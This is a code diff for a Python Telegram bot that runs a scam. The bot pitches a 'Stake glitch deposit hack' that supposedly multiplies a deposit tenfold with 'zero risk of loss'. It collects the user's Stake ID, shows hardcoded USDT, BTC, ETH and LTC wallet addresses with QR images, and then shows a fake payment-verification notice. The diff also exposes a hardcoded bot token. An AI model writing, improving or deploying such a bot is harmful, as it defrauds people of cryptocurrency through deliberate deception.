@@ -5,83 +5,117 @@ from telegram.ext import (
     ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 )
 
-# Replace with your actual bot token
 BOT_TOKEN = '7842485228:AAFb3cDj8RTkR26Vkd5ZZ927ePQPs2g49D4'
-USDT_ADDRESS = 'YOUR_USDT_ADDRESS'
-QR_CODE_FILE = 'qr_code.png'  # Path to your QR code image
+
+# Addresses for each currency
+ADDRESSES = {
+    'USDT': 'TMdVD5hbUu511MX3MBnAdnnXS1fSFwSwvV',
+    'BTC': '121Yjh2kz27GvQeLpEjDNWo8qP5WAdzy3Z',
+    'ETH': '0xc214964fe35e2e8b245686ecc8ea72d5efc221cd',
+    'LTC': '0xc214964fe35e2e8b245686ecc8ea72d5efc221cd',
+}
+
+# Image URLs from your GitHub repo (raw links)
+IMAGES = {
+    'USDT': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/usdt.jpg',
+    'BTC': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/btc.jpg',
+    'ETH': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/eth.jpg',
+    'LTC': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/ltc.jpg',
+}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name
-    text = f'hii "{user_name}" are you ready for stake 10x deposit? If yes then continue'
-    keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
+    text = f'HII "{user_name}" ARE YOU READY FOR STAKE 10X DEPOSIT? IF YES THEN CONTINUE'
+    keyboard = [[InlineKeyboardButton("CONTINUE", callback_data="CONTINUE")]]
     await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    data = query.data
+    data = query.data.upper()
 
-    if data == "continue":
-        text = "Do you want to make a deposit?"
+    if data == "CONTINUE":
+        text = "DO YOU WANT TO MAKE A DEPOSIT?"
         keyboard = [
-            [InlineKeyboardButton("Yes", callback_data="deposit_yes"),
-             InlineKeyboardButton("No", callback_data="deposit_no")]
+            [InlineKeyboardButton("YES", callback_data="DEPOSIT_YES"),
+             InlineKeyboardButton("NO", callback_data="DEPOSIT_NO")]
         ]
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data == "deposit_yes":
+    elif data == "DEPOSIT_YES":
         text = (
-            "🎰 Stake Glitch Deposit Hack (One-Time Use)\n"
-            "We’ve discovered a glitch with Stake bonus deposit codes — and here’s how it works:\n\n"
-            "💎 What It Does\n"
-            "We scrape and apply special bonus deposit codes that multiply your deposit 10x instantly.\n\n"
-            "⚠️ This only works once per account ID.\n\n"
-            "🧠 Important Note\n"
-            "You can’t withdraw the funds immediately.\n"
-            "The bonus behaves like regular Stake bonuses — you must wager the full amount before withdrawing.\n\n"
-            "💰 What’s in It for You?\n"
-            "I’ll provide you with a step-by-step strategy to play safely, wager the required amount, and withdraw the full balance — with zero risk of loss if done right."
+            "🎰 STAKE GLITCH DEPOSIT HACK (ONE-TIME USE)\n"
+            "WE’VE DISCOVERED A GLITCH WITH STAKE BONUS DEPOSIT CODES — AND HERE’S HOW IT WORKS:\n\n"
+            "💎 WHAT IT DOES\n"
+            "WE SCRAPE AND APPLY SPECIAL BONUS DEPOSIT CODES THAT MULTIPLY YOUR DEPOSIT 10X INSTANTLY.\n\n"
+            "⚠️ THIS ONLY WORKS ONCE PER ACCOUNT ID.\n\n"
+            "🧠 IMPORTANT NOTE\n"
+            "YOU CAN’T WITHDRAW THE FUNDS IMMEDIATELY.\n"
+            "THE BONUS BEHAVES LIKE REGULAR STAKE BONUSES — YOU MUST WAGER THE FULL AMOUNT BEFORE WITHDRAWING.\n\n"
+            "💰 WHAT’S IN IT FOR YOU?\n"
+            "I’LL PROVIDE YOU WITH A STEP-BY-STEP STRATEGY TO PLAY SAFELY, WAGER THE REQUIRED AMOUNT, AND WITHDRAW THE FULL BALANCE — WITH ZERO RISK OF LOSS IF DONE RIGHT."
         )
-        keyboard = [[InlineKeyboardButton("Deposit", callback_data="deposit")]]
+        keyboard = [[InlineKeyboardButton("DEPOSIT", callback_data="DEPOSIT")]]
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data == "deposit":
-        await query.edit_message_text("Please enter your Stake user ID:")
-
-        # Set state to expect user ID next
+    elif data == "DEPOSIT":
+        await query.edit_message_text("PLEASE ENTER YOUR STAKE USER ID:")
         context.user_data['awaiting_user_id'] = True
 
-    elif data == "confirm_user_id":
-        # Send USDT address and QR code
-        text = f"Send your deposit to the following address:\n\n{USDT_ADDRESS}\n\nDeposit 100$"
-        keyboard = [[InlineKeyboardButton("Confirm payment", callback_data="confirm_payment")]]
-        await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
-        with open(QR_CODE_FILE, 'rb') as qr:
-            await query.message.reply_photo(qr)
+    elif data == "CONFIRM_USER_ID":
+        # Show currency options after user confirms ID
+        keyboard = [
+            [
+                InlineKeyboardButton("USDT", callback_data="CURRENCY_USDT"),
+                InlineKeyboardButton("BTC", callback_data="CURRENCY_BTC")
+            ],
+            [
+                InlineKeyboardButton("ETH", callback_data="CURRENCY_ETH"),
+                InlineKeyboardButton("LTC", callback_data="CURRENCY_LTC")
+            ]
+        ]
+        await query.edit_message_text("PLEASE SELECT YOUR PAYMENT CURRENCY:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data == "confirm_payment":
+    elif data.startswith("CURRENCY_"):
+        currency = data.split("_")[1]
+        image_url = IMAGES.get(currency)
+        address = ADDRESSES.get(currency)
+
+        if image_url and address:
+            # Send photo from URL
+            await query.message.reply_photo(photo=image_url)
+            # Send address as a copyable message
+            await query.message.reply_text(f"{address}")
+            # Send confirm payment button
+            keyboard = [[InlineKeyboardButton("CONFIRM PAYMENT", callback_data="CONFIRM_PAYMENT")]]
+            await query.message.reply_text("Click the button below after you have made the payment.", reply_markup=InlineKeyboardMarkup(keyboard))
+        else:
+            await query.message.reply_text("⚠️ ERROR: Currency data not found.")
+
+    elif data == "CONFIRM_PAYMENT":
         text = (
-            "🕒 Payment Verification Notice\n\n"
-            "Your payment will be verified within 10–15 minutes.\n\n"
-            "✅ Once verified, your Stake ID will be credited within 5 minutes.\n"
-            "If you still don’t see the funds added, please contact the admin — we're here to help!"
+            "🕒 PAYMENT VERIFICATION NOTICE\n\n"
+            "YOUR PAYMENT WILL BE VERIFIED WITHIN 10–15 MINUTES.\n\n"
+            "✅ ONCE VERIFIED, YOUR STAKE ID WILL BE CREDITED WITHIN 5 MINUTES.\n"
+            "IF YOU STILL DON’T SEE THE FUNDS ADDED, PLEASE CONTACT THE ADMIN — WE'RE HERE TO HELP!"
         )
         await query.edit_message_text(text)
 
+    elif data == "DEPOSIT_NO":
+        await query.edit_message_text("OK, IF YOU CHANGE YOUR MIND, JUST TYPE /START TO BEGIN AGAIN.")
+
 async def handle_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.user_data.get('awaiting_user_id'):
-        user_id = update.message.text
+        user_id = update.message.text.strip()
         context.user_data['stake_user_id'] = user_id
         context.user_data['awaiting_user_id'] = False
-        text = f"Your Stake user ID is: {user_id}\n\nType CONFIRM to confirm."
-        await update.message.reply_text(text)
-        context.user_data['awaiting_confirm'] = True
 
-    elif context.user_data.get('awaiting_confirm') and update.message.text.strip().upper() == "CONFIRM":
-        # Simulate button press for confirm_user_id
-        keyboard = [[InlineKeyboardButton("Continue", callback_data="confirm_user_id")]]
-        await update.message.reply_text("Click continue to receive deposit details.", reply_markup=InlineKeyboardMarkup(keyboard))
-        context.user_data['awaiting_confirm'] = False
+        # Send confirmation button instead of asking for text confirmation
+        keyboard = [[InlineKeyboardButton("CONFIRM", callback_data="CONFIRM_USER_ID")]]
+        await update.message.reply_text(
+            f"YOUR STAKE USER ID IS: {user_id}\n\nCLICK CONFIRM TO PROCEED.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
